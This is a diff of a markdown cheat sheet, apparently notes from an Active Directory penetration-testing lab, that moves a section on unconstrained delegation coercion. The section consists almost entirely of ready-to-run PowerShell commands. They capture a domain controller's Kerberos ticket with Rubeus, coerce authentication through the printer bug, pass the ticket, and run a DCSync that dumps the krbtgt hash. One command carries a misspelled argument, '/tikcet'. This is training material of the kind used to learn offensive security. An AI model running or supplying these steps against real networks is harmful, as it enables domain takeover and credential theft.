@@ -1,3 +1,26 @@
+
+### Unconstrained Delegation Coercion
+Coarse/Force machine accounts to connect to a machine and capture their TGT
+
+Use Rubeus on App server (`dcorp-appsrv`) to capture TGT of DC machine account
+```powershell
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /interval:5 /nowrap
+```
+
+Abuse printer bug to force the DC to connect to the App server
+```powershell
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/MS-RPRN.exe -args \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
+```
+
+Copy the base64 encoded TGT, remove extra spaces (if any) and use it on your attacking host
+```powershell
+.\Loader.exe -path .\Rubeus.exe -args ptt /tikcet:<base64>
+```
+
+Perform DCsync thats OPSEC safe because it's the machine account
+```powershell
+.\Loader.exe -path .\SafetyKatz.exe -args lsadump::dcsync /user:dcorp\krbtgt
+```
 ### Abusing Unconstrained Delegation
 Discover computers with unconstrained delegation (PowerView + AD module)
 ```powershell
@@ -27,16 +50,4 @@ Copy the base64 encoded TGT, remove extra spaces (if any) and use it on your att
 Perform DCsync thats OPSEC safe because it's the machine account
 ```powershell
 .\Loader.exe -path .\SafetyKatz.exe -args lsadump::dcsync /user:dcorp\krbtgt
-```
-### Unconstrained Delegation Coercion
-Coarse/Force machine accounts to connect to a machine and capture their TGT
-
-Use Rubeus on App server (`dcorp-appsrv`) to capture TGT of DC machine account
-```powershell
-C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /interval:5 /nowrap
-```
-
-Abuse printer bug to force the DC to connect to the App server
-```powershell
-C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/MS-RPRN.exe -args \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
 ```
